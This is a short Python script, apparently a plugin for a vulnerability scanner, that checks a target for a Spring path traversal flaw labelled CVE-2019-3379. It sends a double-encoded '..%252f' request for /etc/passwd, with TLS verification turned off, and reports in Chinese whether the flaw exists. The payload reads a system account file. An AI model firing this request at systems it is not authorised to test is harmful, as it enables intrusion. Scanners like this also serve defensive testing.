import requests
import re
from bs4 import BeautifulSoup
import logging
import json

ca=''
http = ''
https = ''
def adl121a(dl):
    global http,https
    http=dl
    https=dl
def tk(url,s_cookie):
    global http, https
    global ca
    try:
        proxies = {'http': http,
                   'https': https}
        logging.captureWarnings(True)
        r = requests.get(url+'test/pathtraversal/master/..%252f..%252f..%252f..%252f../etc/passwd',cookies=s_cookie, proxies=proxies, verify=False)
        r.encoding = 'utf-8'
        ca = BeautifulSoup(r.text, 'html.parser')
        vulnerable_signs = [
            r"x:0:0:root:/root:",
            r"/sbin/nologin",
            r"daemon"
        ]
        if r.status_code == 200 and all(sign in r.text for sign in vulnerable_signs):
            ca ="""
                 [+]漏洞存在\n
                 /test/pathtraversal/master/..%252f..%252f..%252f..%252f../etc/passwd\n
                """
        else:
            ca='[-]漏洞不存在\n'
    except Exception as aaa:
        ca='[-]页面访问失败\n'+str(aaa)
def jg51a():
    global ca
    return '--------------------------------------------------\n[ Spring CVE-2019-3379 ]\n\n'+ str(ca)
def u41a(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        tk(url1,s_cookie)
    elif pd=='1':
        tk(url1,s_cookie)